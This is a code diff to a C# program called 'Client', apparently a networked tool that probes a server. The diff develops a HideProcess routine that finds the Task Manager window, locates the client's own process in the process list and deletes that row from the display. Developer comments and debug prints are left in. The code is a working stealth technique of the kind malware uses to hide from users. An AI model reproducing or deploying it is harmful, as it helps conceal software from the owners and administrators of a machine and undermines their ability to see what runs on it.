@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Diagnostics;
 using System.Linq;
+using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Threading;
 using Client.API;
@@ -72,6 +73,8 @@ namespace Client
             _Server.Probe();
         }
 
+        // Hacky as fuck but it seems to be working so far
+        // Needs removal of hardcoded application name and some other general improvements.
         private static void HideProcess()
         {
             IntPtr lhWndParent = DKOM.FindWindow(null, "Task Manager");
@@ -129,12 +132,28 @@ namespace Client
             }
 
             DKOM.LockWindowUpdate(lhSysListView32);
-            
 
+            List<Process> proclist = Process.GetProcesses().ToList();
+            proclist = proclist.OrderBy(x => x.ProcessName).ToList();
+            List<string> procNames = new List<string>();
+
+            int index = 0;
+
+            foreach (Process p in proclist)
+            {
+                if(p.ProcessName.ToLower().Contains("client"))
+                    Console.WriteLine(p);
+
+                if (p.ProcessName.ToLower() == "client.vshost")
+                {
+                    index = proclist.IndexOf(p);
+                    Console.WriteLine("Got");
+                }
+            }
 
             DKOM.PostMessage(lhWndParent, DKOM.WM_COMMAND, refreshNowButton, 0); //Refresh
             DKOM.PostMessage(lhSysListView32, DKOM.LVM_SORTITEMS, 0, 0);         //Sort
-            DKOM.PostMessage(lhSysListView32, DKOM.LVM_DELETEITEM, i, 0);        //Delete
+            DKOM.PostMessage(lhSysListView32, DKOM.LVM_DELETEITEM, index, 0);        //Delete
           
             
             DKOM.LockWindowUpdate(IntPtr.Zero);
